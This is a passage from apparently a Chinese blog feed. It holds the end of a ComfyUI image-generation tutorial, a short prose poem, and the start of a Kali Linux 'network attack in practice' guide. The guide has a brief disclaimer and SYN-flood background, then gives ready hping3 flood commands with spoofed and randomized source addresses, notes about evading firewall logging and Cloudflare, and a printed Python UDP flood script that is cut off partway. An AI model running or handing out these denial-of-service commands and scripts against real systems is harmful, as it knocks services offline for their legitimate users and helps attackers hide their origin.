noreferrer">comfyui_controlnet_aux</a></td><td>常用的 ControlNet 预处理器</td></tr><tr><td><a href="https://github.com/Kosinkadink/ComfyUI-Advanced-ControlNet" rel="external nofollow noreferrer">ComfyUI-Advanced-ControlNet</a></td><td>ControlNet 的高级特性</td></tr><tr><td><a href="https://github.com/AlekPet/ComfyUI_Custom_Nodes_AlekPet" rel="external nofollow noreferrer">ComfyUI_Custom_Nodes_AlekPet</a></td><td>扩展 ComfyUI 功能的自定义节点，例如 ControlNet 姿势、文本翻译并返回字符串、校正图像颜色、直接运行代码等</td></tr><tr><td>……</td><td>……</td></tr></tbody></table><p>限于篇幅，许多插件无法在此一一列出。建议先把表格中前两个插件安装好（后文的部分操作可能还会用到这些插件），其他的插件按需配置。建议准备好网络加速工具，由于网络加速工具种类繁多，故不在此详细说明（目的是保证 GitHub、HuggingFace 的访问，镜像站也行）。</p><p>（所谓“插件”，其实应该称“扩展”，ComfyUI 中为“节点”；但此处为防止给新手造成理解问题，本文有时会称其为“插件”）</p><h2 id="工作流">工作流</h2><p>（ComfyUI 加上不同的节点，能做的事情不只有绘图，但这里我们以最基本的绘图为例说明。）</p><p>ComfyUI 的主界面是一张画布，可以通过右键创建、编辑、删除节点。官方已经预配置的工作流，可以在顶部导航栏中的<code>工作流</code>-&gt;<code>预览模板</code>中选择并加载。也可以通过<code>工作流</code>-&gt;<code>打开</code>加载他人分享的工作流。网络上已经有开发者和爱好者分享了工作流，在 <a href="https://comfyui-wiki.com/zh/workflows" rel="external nofollow noreferrer">ComfyUI 工作流示例</a>、<a href="https://comfyworkflows.com/workflows" rel="external nofollow noreferrer">Comfy Workflows</a>、Civitai 网站（还是那个模型站，但它没有直接入口，而是需要在页面中过滤器里选择 workflow）等处都可以找到工作流。</p><p>以官方预设的文生图工作流为例。每一个矩形块就是一个节点（Nodes），连接每个节点的线就是边（Edges）。每个节点有不同的输入、输出、参数属性，不同节点的输入和输出端如果匹配，可以通过连线连接；多个节点按照一定的规则连接，形成一个完整的工作流。</p><p>现在我们使用一些简单的提示词，使用 Anything V5 模型创作一张图片：</p><p><img src="https://s2.loli.net/2024/12/29/DB6w27PyA4aeLcO.png" alt=""></p><ul><li>在最左侧的<code>Checkpoint 加载器</code>中可以选择模型，也就是之前配置的 checkpoint 模型</li><li>随后是两个<code>CLIP 文本编码器</code>，分别用于输入正向提示词和负面提示词（当工作流复杂时，建议在右键节点选择<code>属性</code>对其重命名，以便区分，增强工作流可读性）</li><li>下方有一个<code>空 Latent</code>节点，用于采样降噪，可以在其中设置图像宽高和生成单批次数量</li><li>Checkpoint 加载器、CLIP 文本编码器和空 Latent 被连接至<code>K 采样器</code>，在这里可以调整种子、步数、采样器等参数</li><li>K 采样器处理完后将数据传入<code>VAE 解码</code>节点，之前的 Checkpoint 加载器中也有一个 VAE 输出连至此处（一个大模型自身就带有 VAE，因此直接这样连接是合理的。当模型自带的 VAE 损坏或其他需要手动设置 VAE 时，需要右键-&gt;<code>新建节点</code>-&gt;<code>采样器</code>-&gt;<code>VAE 加载器</code>创建单独的 VAE 加载器节点，之后将这个节点连接到 VAE 解码节点的<code>VAE</code>输入点，此时 Checkpoint 加载器的 VAE 输出点留空）</li><li>最后是<code>保存图像</code>，整个流程运行完后，生成的图像在这里显示和储存</li></ul><p>配置好参数后，点击<code>执行</code>按钮，等待图像生成。默认情况下，在运行时，当前被触发的节点会被用绿框标注，随着流程的进行而变换标注节点；顶部的进度条展示的是整个工作流的生成进度和当前被触发的节点。如果你对 AI 绘图的原理比较熟悉，会注意到整个工作流与实际生成流程是一致的。如果你知晓其原理流程，那么配置工作流会方便很多。</p><p>当你对工作流作出修改后，想要储存或导出，同样在顶部菜单的<code>工作流</code>按钮中设置。这会将当前配置的流程和节点参数储存，下次加载时可以快速恢复上次的状态。</p><h2 id="保存图片命名规则">保存图片命名规则</h2><p>【待编写】</p><h2 id="复现-WebUI-效果">复现 WebUI 效果</h2><h3 id="二者对提示词的处理差异">二者对提示词的处理差异</h3><p>如果两个程序你都使用，可能会注意到，许多在 WebUI 中工作正常的提示词，到了 ComfyUI 中结果大相径庭。</p><p>其实，二者的提示词处理方式是存在差异的。让我们看看 <a href="https://comfyanonymous.github.io/ComfyUI_examples/faq/" rel="external nofollow noreferrer">Frequently Asked Questions</a> 中作者是怎么说的：</p><blockquote><p><strong>Why do I get different images from the a1111 UI even when I use the same seed?</strong></p><p>In ComfyUI the noise is generated on the CPU. Generating noise on the CPU gives ComfyUI the advantage that seeds will be much more reproducible across different hardware configurations but also means they will generate completely different noise than UIs like a1111 that generate the noise on the GPU. Generating noise on the GPU vs CPU does not affect performance in any way.</p></blockquote><p>ComfyUI 上的噪声在 CPU 上生成，而在 a1111 的 WebUI 中，它是在 GPU 上生成的。这使得 ComfyUI 种子（seed）可以在不同的硬件配置中重现，但使它们与 a1111 的 WebUI 使用的种子不同。</p><p>随机种子会影响添加噪声和去除噪声过程，而这两个程序对于种子的处理不同，自然而然其生成图像的效果也有所不同。</p><p>还有提示词的处理差异：</p><blockquote><p>In ComfyUI the prompt strengths are also more sensitive because they are not normalized. A very short example is that when doing</p><p>(masterpiece:1.2) (best:1.3) (quality:1.4) girl</p><p>The a1111 ui is actually doing something like (but across all the tokens):</p><p>(masterpiece:0.98) (best:1.06) (quality:1.14) (girl:0.81)</p><p>In ComfyUI the strengths are not averaged out like this so it will use the strengths exactly as you prompt them.</p><p>There are also many other differences but these two are the ones that have most impact.</p></blockquote><p>WebUI 会将提示词的权重平均化，使其差异缩小。但在 ComfyUI 中没有这一过程，它将完全按照提示词的权重进行处理。如果你阅读过一些 SD 社区的文档，会了解到许多人不建议给出十分离谱的权重值；也许 WebUI 会帮你挽回一些效果，但 ComfyUI 不会。</p><p>既然知道问题所在了，那么解决方法也就有了（并不是说这么做就一定能复现在 WebUI 上的效果）。对于普通爱好者而言，不必太详细了解它们机制的细节差异，只需让 ComfyUI 以 WebUI 的方式处理提示词就行。</p><h3 id="如何复刻">如何复刻</h3><p>在这里我们需要用到这些插件：</p><table><thead><tr><th>名称和链接</th><th>功能简介</th></tr></thead><tbody><tr><td><a href="https://github.com/BlenderNeko/ComfyUI_ADV_CLIP_emb" rel="external nofollow noreferrer">Advanced CLIP Text Encode</a></td><td>对提示权重的解释方式进行更多控制</td></tr><tr><td><a href="https://github.com/ltdrdata/ComfyUI-Inspire-Pack" rel="external nofollow noreferrer">ComfyUI-Inspire-Pack</a></td><td>提供了各种扩展节点（作者注：与 ComfyUI Impact Pack 中的节点相比，这里的节点具有不同的特征。Impact Pack 现在已经变得太大了……）</td></tr><tr><td><a href="https://github.com/BlenderNeko/ComfyUI_Noise" rel="external nofollow noreferrer">ComfyUI Noise</a></td><td>允许对噪声进行更多和更灵活的控制</td></tr></tbody></table><p>但在接下来的演示中，我们只使用前两个插件提供的节点，也能较好地复现 WebUI 的效果。若精益求精，可以将第三个插件的节点也用上。可以使用 Git 或 ComfyUI-Manager（需安装插件）安装插件。</p><p>完成后启动并打开 ComfyUI 界面，在你准备复现 WebUI 效果的工作流的画布中，右键画布空白处-&gt;<code>新建节点</code>-&gt;<code>条件处理</code>-&gt;<code>高级</code>-&gt;<code>CLIP 文本编码器（BNK）</code>创建新的文本编码器节点（选项名称的翻译可能存在微小差别），并将节点中的<code>Token 规格化</code>保持 none 不修改，将<code>权重插值方式</code>更改为<code>A1111</code>。一般输入文本有正面和负面，以同样的方式再创建一个相同的节点（也可以在设置好后右键该节点后<code>克隆</code>）。需要注意，这里有 SD 和 SDXL 模型的区别，按照自己的情况选择。</p><p>之后再次在画布空白处右键-&gt;<code>新建节点</code>-&gt;<code>Inspire 节点</code>-&gt;<code>A111 适配</code>-&gt;<code>K 采样器（Inspire）</code>创建新的 K 采样器节点，并将<code>噪波模式</code>设置为<code>GPU（=A1111）</code>。</p><p><img src="https://s2.loli.net/2024/12/29/u5AhcqTzi2pFfXS.png" alt=""></p><p>新的节点设置好后，只需把原来的 CLIP 文本编码器节点和 K 采样器换节点成新的节点（重新连线），并将原来设置的其他参数照搬到新的节点中，即可完成设置。</p><p><img src="https://s2.loli.net/2024/12/29/Qr5mWb6a4dUJE8f.png" alt=""></p><h2 id="常见问题与技巧">常见问题与技巧</h2><h3 id="节点变红与手动安装">节点变红与手动安装</h3><p>如果你的工作流中出现了大量红色节点和红色提示，则表明当前环境缺少相应的节点，需要将其安装后才能正常使用。可以在顶部菜单栏找到<code>管理器</code>打开 ComfyUI 管理器面板，点击<code>安装缺失节点</code>，等待自动检测并选择安装。其他插件、更新组件、模型管理等的入口也在这里。</p><p><img src="https://s2.loli.net/2024/12/29/OgTLvRVAjyk537t.png" alt=""></p><p>这里需要确保能够正常连接 GitHub（不仅仅只是 <a href="http://github.com" rel="external nofollow noreferrer">github.com</a> 网站）。如果网络条件不佳，可能会下载失败，此时只能手动下载。找到你所缺的节点后，记下 Git 地址，之后进入 ComfyUI 目录下的<code>custom_nodes</code>目录，在此目录下右键打开 Git Bash，执行 clone 命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> 【Git 地址】</span><br></pre></td></tr></table></figure><p>安装好后可能需要重载 UI 甚至重启程序才能正常加载，更新亦然。</p><p>不知道地址？可以在刚才的 ComfyUI 管理器界面点击<code>安装缺失节点</code>，等待加载完成后点击其 Title 列相应的标题，跳转至 GitHub 网站，找到文件列表上方的绿色<code>Code</code>按钮并点击，将<code>HTTPS</code>下方的地址记下（链接末尾一般带有<code>.git</code>），再回来执行命令（替换掉<code>【Git 地址】</code>）。</p><p>在<code>节点管理</code>中找到插件但无法顺利下载的也可以使用这种方法，<strong>但并不是所有的插件都可以直接用这种方式安装</strong>（这和 WebUI 不一样），因此能用 ComfyUI-Manager 或绘世启动器安装的就不要手动安装，实在需要手动安装的请仔细阅读插件说明文档。</p><p>整合包有 Git 但本机没安装？把命令前的<code>git</code>替换为你整合包中 Git.exe 路径即可，例如（假设你的 ComfyUI 放在 E 盘，下同）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E:\ComfyUI\git\cmd\git.exe <span class="built_in">clone</span> 【Git 地址】</span><br></pre></td></tr></table></figure><p>安装好后再回到<code>节点管理</code>中，检查安装的插件，若<code>安装</code>一列显示的是 disable、uninstall 之类的而不是<code>install</code>，则表明已经安装完成。</p><h3 id="Python-依赖">Python 依赖</h3><p>有些节点仅 clone 到本地后还需要安装依赖，一般程序在加载时会自动处理，也可以按照开发者的说明文档（<a href="http://README.md" rel="external nofollow noreferrer">README.md</a>）手动安装依赖。例如，对于一些需要额外安装依赖的节点，可以在该节点目录中打开终端，执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><p>如果你的 Python 也是便携版的，那么需要手动指定 Python 和 pip 的路径，例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E:\ComfyUI\python\python.exe -m pip install -r requirements.txt</span><br></pre></td></tr></table></figure><p><code>-m</code>可以让 Python 自动找到 pip 的路径（如果想手动指定也可以，连着<code>-m pip</code>一起换了）。</p><p>如果在运行时，程序终端出现类似于<code>No module named xxx</code>这种错误，也需要手动安装这些包。</p><h3 id="HuggingFace-设置镜像">HuggingFace 设置镜像</h3><p>请优先尝试调整代理软件。如果仍然未解决问题，可以更换为国内镜像站 <a href="https://hf-mirror.com/" rel="external nofollow noreferrer">HF-Mirror</a>。</p><p>如果你使用的是一键包，则进入你的 ComfyUI 目录中，找到 Python 目录，进入后找到<code>python\Lib\site-packages\huggingface_hub</code>目录，打开<code>__init__.py</code>文件，拖到最底下添加一行后保存并退出文件编辑：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.environ[<span class="string">&#x27;HF_ENDPOINT&#x27;</span>] = <span class="string">&#x27;https://hf-mirror.com&#x27;</span></span><br></pre></td></tr></table></figure><p>如果你使用的是官方一键包，还可以使用文本编辑器打开你使用的那个脚本，在开头添加一行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> HF_ENDPOINT=https://hf-mirror.com  </span><br></pre></td></tr></table></figure><p>目的是让 ComfyUI 可以从环境变量读到这个设置的参数。</p><h3 id="VAE-紫框">VAE 紫框</h3><p>如果你的工作流执行到 VAE 处后，VAE 节点出现紫框并弹出报错（如果你用的是 webui，差不多也是在出图的最后一步卡住）。如果你通过任务管理器等工具查看，发现在执行到 VAE 时 GPU 占用剧增后程序报错，可以考虑下是不是爆显存导致的问题。</p><p>让我们看看在 SD 的出图过程中，VAE 做了什么：</p><ul><li>图像编码，将输入图像压缩成一个低维的潜在空间，提取出图像的主要特征，并以更小的表示形式存储</li><li>生成新图像，通过对编码的特征进行采样来生成新的图像，生成多样化的图像，并保持了其在某种程度上与训练数据的相似性</li><li>重构图像，通过解码器将潜在表示转换回原始图像，在这里用于生成新图像</li></ul><p>DeepSeek 是这样解释的：</p><p>VAE 解码器的核心任务是将低维潜在空间（latent space）的张量上（如 4×64×64）采样为高分辨率图像（如 512×512）。这一过程涉及多级上采样和卷积操作。</p><p>例如，单个 512 通道的 256×256 特征图（float32）占用空间：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mn>512</mn><mo>×</mo><mn>256</mn><mo>×</mo><mn>256</mn><mo>×</mo><mn>4</mn><mi>b</mi><mi>y</mi><mi>t</mi><mi>e</mi><mi>s</mi><mo>≈</mo><mn>134</mn><mi>M</mi><mi>B</mi></mrow><annotation encoding="application/x-tex">512×256×256×4 bytes≈134 MB</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">512</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">256</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">256</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord">4</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal">t</span><span class="mord mathnormal">es</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">134</span><span class="mord mathnormal" style="margin-right:0.05017em;">MB</span></span></span></span></span></p><p>若批量大小为 8，则单层占用显存：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mn>134</mn><mi>M</mi><mi>B</mi><mo>×</mo><mn>8</mn><mo>≈</mo><mn>1</mn><mi>G</mi><mi>B</mi></mrow><annotation encoding="application/x-tex">134MB×8≈1 GB</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord">134</span><span class="mord mathnormal" style="margin-right:0.05017em;">MB</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">8</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">1</span><span class="mord mathnormal" style="margin-right:0.05017em;">GB</span></span></span></span></span></p><p>这个过程中需要执行大量的矩阵运算和非线性激活函数，当你设定的分辨率越高，这些数据量便越大，直到超出显存限制。如果你一次性生成多张图片，那么对显存的压力也会按批量大小成倍增长。</p><p>若你有更好的硬件，自然是更换；若无，可以尝试启用半精度（出图质量有所下降，显存压力变小），或者干脆把 VAE 的部分放到 CPU 执行（使用绘世启动器的用户，可以前往<code>高级选项</code>-&gt;<code>使用 CPU 运行 VAE</code>将其启用）。（这样设置后，我用低配显卡也能安心跑图了，甚至生成音乐也不卡死了）</p>]]></content>
      
      
      <categories>
          
          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 程序 </tag>
            
            <tag> AI 绘图 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算术课后</title>
      <link href="/posts/1726040825/"/>
      <url>/posts/1726040825/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>一支粉笔断了，躺在讲台上，<br>没人在意它怎么断的。</p><p>它曾在黑板上划过痕迹。<br>现在，黑板干干净净，<br>如同崭新出厂一般。</p><p>圆规还在画圈，<br>画好的圈，像一间间没有门窗的小屋子。</p><p>橡皮擦很忙。<br>这边擦掉一个算式，印子还没干透；<br>那边刚改的数字，又被红笔圈了出来。</p><p>纸面看着平整。<br>只是，涂改、擦拭久了，有些地方薄得透光。</p><p>一道折痕，不知什么时候压下的。<br>浅浅的，里面仿佛写着“不算”。</p><p>啪嗒——<br>一滴墨水落下。<br>纸上鼓起一道新痕，又深又硬。<br>隐约的，像写着“算”。</p><p>一方镇纸压了下去，冰凉透明，<br>正好盖住那个“算”字。<br>鼓起的地方慢慢塌了，压平了。<br>可周围的纸，也陷了下去，<br>揪成一团难看的褶子。</p><p>镇纸下面，“算”字清清楚楚。<br>那道浅痕和旁边的皱褶，都被压在平滑之下。</p><p>纸面好像更平整了？<br>像是一切都没了痕迹。<br>那块镇纸，依旧冰凉，透明。<br>静静地伏在那里。</p><p>值日生擦着黑板，粉笔灰簌簌地掉进墙角一个旧纸盒，<br>盒里躺着那半截断了的粉笔，蒙上了灰。</p><p>数学的推理严谨而巧妙，板书满面，好不壮观。<br>可惜对大部分学生而言，它实在晦涩难懂。<br>板擦滑过，从推导过程开始，最后是结果。<br>黑板再度变得一尘不染。</p><p>夜深了，风溜进窗缝。<br>几页纸被吹落地面，我弯腰去捡。</p><p>一张飘到脚边。两个名字：<br>一个名字端端正正，写了个小红叉；<br>另一个名字写得马虎，旁边倒是打了个红勾。</p><p>一张钻进了柜子底，只看得到一个角：<br>“过关”两个字后面，是一行不小的数字。<br>纸的四边都磨损了，卷了起来。</p><p>还有一张，落在窗台上。<br>纸上的水痕洇开，笔画变得模糊。<br>纸背，却是一个大大的红印，扎眼得很，<br>像是盖着“合格”的印章。<br>那红色，还是那么刺人眼睛。</p><p>风停了。手里捏着纸，显得有点沉。</p><p>算什么呢？</p><p>有些东西，好像根本算不明白。</p><p>或者说，算不算数，从来不是纸上的水印说了算，<br>也不是那些数字说了算。<br>甚至，也不是那个大红印章真的点过头的。</p><p>全看纸在谁的手上，<br>那印章在握在谁的手里。</p><p>旧铁皮垃圾桶里，我点起了火。<br>捏着手里的纸，抬手，松手<br>一张，一张，<br>飘向那明亮的焰。</p><p>纸卷起来，变黑，化成灰。<br>火苗舔过那张纸，<br>那张背上印着鲜红“合格”的纸，也不例外，<br>那两个字挣扎了一下，也化开了。</p><p>灰烬很轻。<br>风又钻进来，把它们吹得四处飘散。</p><p>算什么呢？</p><p>有些东西，算不清。</p><p>可屋子里好像还留着点什么味道。</p><p>不是烟味。</p><p>有点涩，像粉笔灰沾在袖口上。</p><p>又有点腥，像…铁锈？</p><p>说不清。</p>]]></content>
      
      
      <categories>
          
          <category> 闲聊随写 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>使用 Kali 进行简单网络攻击实战</title>
      <link href="/posts/876737918/"/>
      <url>/posts/876737918/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>严禁利用本文内容进行违反法律和道德的用途，仅可用于自行测试，否则后果自负，这不是个玩具。</p></blockquote><h2 id="铺垫">铺垫</h2><h3 id="DoS">DoS</h3><p>DoS（Denial of Service，拒绝服务攻击）亦称洪水攻击，是一种网络攻击手法，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。</p><h3 id="DDoS">DDoS</h3><p>DDoS（Distributed Denial of Service，分布式拒绝服务），是一种针对于网络服务的攻击行为。可以类比，假如有一家商店在售卖商品，突然涌过来一大帮人说要买东西，这里面有的人是真正的顾客，有的人只是过来捣乱的，但是售货员可能就会崩溃了（不知道该卖给谁），就会导致一种拒绝服务攻击了，从而真正想要买东西的顾客因为店里挤得进不去而得不到接待。</p><h3 id="SYN-Flood">SYN Flood</h3><p>SYN 泛洪攻击（半开放攻击）是一种常见又典型的 DoS 攻击，利用 TCP 连接的握手过程来工作。</p><p>一个 TCP 连接的建立流程如下：</p><ol><li>客户端发送一个 SYN 报文给服务端，并且将连接的状态设置为 SYN_SENT（同步已发送）。</li><li>服务端接收到客户端发送过来的 SYN 包 后，回复一个 SYN+ACK 包给客户端，并且设置连接的状态从 Listen 变为 SYN_RCVD。</li><li>客户端接收到发回来的 SYN+ACK 包 后，设置连接状态为 ESTABLISHED（连接成功），并且回复一个 ACK 包 给服务端。</li><li>服务端接收到客户端发送过来的 ACK 包 后，将连接状态设置为 ESTABLISHED（连接成功）。</li><li></li></ol><p>至此，一个 TCP 连接建立完成。</p><p>服务端接收到客户端的包后，会建立一个半连接状态的 Socket。但是，如果这里的第三步客户端不管了，则服务器会等待超时重传。如果客户端在短时间内多次进行这个操作，则服务器资源会耗尽，这就是泛洪攻击的原理。</p><h2 id="DoS-实战">DoS 实战</h2><p>Hping3 是一个命令行下使用的 TCP/IP 数据包工具，通常 web 服务会用来做压力测试使用，也可以进行 DoS 攻击的实验。这里我们以该工具进行实战。</p><p>进入 Kali Linux，确认你已经配置完该配置的东西后，使用 Nmap 扫描存活主机（或自己另准备待测试的 IP 或域名）。先 Ping 一下，确认 Kali 能正常与目标地址通信，随后右键打开终端，执行以下命令（若失败不妨尝试以 root 身份执行）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood --rand-source www.example.com</span><br></pre></td></tr></table></figure><details class="toggle" ><summary class="toggle-button" style="">可能涉及到的参数及含义</summary><div class="toggle-content"><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>-a</td><td>源地址欺骗。伪造 IP 攻击，防火墙就不会记录你的真实 IP 了，当然回应的包你也接收不到了</td></tr><tr><td>-q</td><td>安静模式</td></tr><tr><td>-n</td><td>数字化输出，象征性输出主机地址</td></tr><tr><td>-c</td><td>发送的数据包的数量</td></tr><tr><td>-d</td><td>发送到目标机器的每个数据包的大小，单位是字节，缺省则是 0</td></tr><tr><td>-S</td><td>设置 SYN flag 为 1</td></tr><tr><td>-w</td><td>TCP 窗口大小（接收方当前可用于接收数据的缓冲区大小，当发送方发送的数据量超过这个值后，发送方将停止发送数据，直到收到接收方的确认（ACK）消息为止）</td></tr><tr><td>-p</td><td>受攻击方端口</td></tr><tr><td>–-flood</td><td>尽最快发送数据包，不显示回复</td></tr><tr><td>–rand-source</td><td>随机源地址模式（只是在局域网中伪造）</td></tr><tr><td>–keep</td><td>保持源端口</td></tr></tbody></table></div></details><p>这段命令大致含义为：Hping3 命令，设置 SYN flag 标志位为 1，发送 1000 个 SYN 数据包，每个包大小为 120 字节，将 TCP 窗口大小设置为 64，受攻击方端口为 80，尽最快发送数据包而不显示回复，使用随机源地址模式，向 <code>www.example.com</code> 照以上规则发送数据。</p><p>末尾处可以直接填 IP 地址，也可以填写域名，但域名不要加前缀（例如<code>https://</code>）。</p><p>或者可以这样：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 -q -n -a 4.4.4.4 -S -s 1001 --keep -p 443 --flood 192.168.90.140</span><br></pre></td></tr></table></figure><p>这样含义为：安静模式，数字化象征性输出主机地址，伪造源 IP 地址为 4.4.4.4，伪造源端口号为 1001，保持源端口，被攻击机目标端口号为 443，尽最快发送数据包而不显示回复，对 192.168.90.140 按照以上规则发送数据。</p><p>执行命令后，若窗口出现“hping in flood mode,no replies will be shown”等字样，则表明攻击正在进行。此时使用 wireshark 等抓包工具，可以查看攻击过程，从而方便理解其原理。</p><p>如果你试图攻击像套了 CF 等防御设施的网站，Ctrl+C 后肯定要等上一会才能继续“尝试”。</p><h2 id="DDoS-实战">DDoS 实战</h2><p>这里我们使用 Python 脚本完成。</p><p>请先更新软件源，不知道如何操作的可以自行百度。此处需要 Python3 环境能够正常使用（你可能会下载到 Python2 环境，不过可以解决）。</p><p><a href="https://github.com/Ha3MrX/DDos-Attack" rel="external nofollow noreferrer">https://github.com/Ha3MrX/DDos-Attack</a></p><p>前往此处下载脚本并拖入 KaliLinux 中，创建一个文件夹用于存放该文件（此处以<code>DDos-Attack</code>目录为例，文件名称为<code>ddos-attack.py</code>）并进入。随后在该目录下打开终端，执行命令修复权限：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x ddos-attack.py</span><br></pre></td></tr></table></figure><p>对这个文件进行修改，从而兼容可能出现的版本问题（你的文件可能与这里的不太一样，请酌情修改）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="comment">#Code Time</span></span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line">now = datetime.now()</span><br><span class="line">hour = now.hour</span><br><span class="line">minute = now.minute</span><br><span class="line">day = now.day</span><br><span class="line">month = now.month</span><br><span class="line">year = now.year</span><br><span class="line"></span><br><span class="line"><span class="comment">##############</span></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"><span class="built_in">bytes</span> = random._urandom(<span class="number">1490</span>)</span><br><span class="line"><span class="comment">#############</span></span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&quot;clear&quot;</span>)</span><br><span class="line">os.system(<span class="string">&quot;figlet DDos Attack&quot;</span>)</span><br><span class="line"><span class="built_in">print</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Author   : HA-MRX&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;You Tube : https://www.youtube.com/channel/UCCgy7i_A5yhAEdY86rPOinA&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;github   : https://github.com/Ha3MrX&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Facebook : https://www.facebook.com/muhamad.jabar222&quot;</span>)</span><br><span class="line"><span class="built_in">print</span></span><br><span class="line">ip = <span class="built_in">input</span>(<span class="string">&quot;IP Target : &quot;</span>)</span><br><span class="line">port = <span class="built_in">input</span>(<span class="string">&quot;Port       : &quot;</span>) <span class="comment"># 修改处</span></span><br><span class="line">port = <span class="built_in">int</span>(port) <span class="comment"># 修改处</span></span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&quot;clear&quot;</span>)</span><br><span class="line">os.system(<span class="string">&quot;figlet Attack Starting&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[                    ] 0% &quot;</span>) <span class="comment"># 修改处</span></span><br><span class="line">time.sleep(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[=====               ] 25%&quot;</span>) <span class="comment"># 修改处</span></span><br><span class="line">time.sleep(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[==========          ] 50%&quot;</span>) <span 